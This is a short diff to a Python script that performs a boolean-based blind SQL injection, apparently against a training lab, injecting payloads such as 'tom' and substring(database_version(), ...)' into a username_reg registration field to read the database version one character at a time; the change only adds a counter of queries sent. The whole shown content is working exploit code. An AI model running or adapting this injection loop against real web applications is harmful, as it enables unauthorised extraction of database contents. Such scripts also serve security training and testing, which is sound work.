@@ -18,10 +18,12 @@ def get_version(cookie):
     version = ''
     digit_index = 0
     version_index = 0
+    no_of_queries = 0
 
     while True:
         query = f'tom\' and substring(database_version(), {version_index + 1}, 1)=\'{digits[digit_index]}'
         print(query)
+        no_of_queries += 1
 
         data = {
             'username_reg': query,
@@ -43,6 +45,7 @@ def get_version(cookie):
             digit_index += 1
             if digit_index > len(digits) - 1:
                 pickle.dump(version, open('outputs/version.pkl', 'wb'))
+                print(f'No of queries: {no_of_queries}')
                 return version
         else:
             version += digits[digit_index]
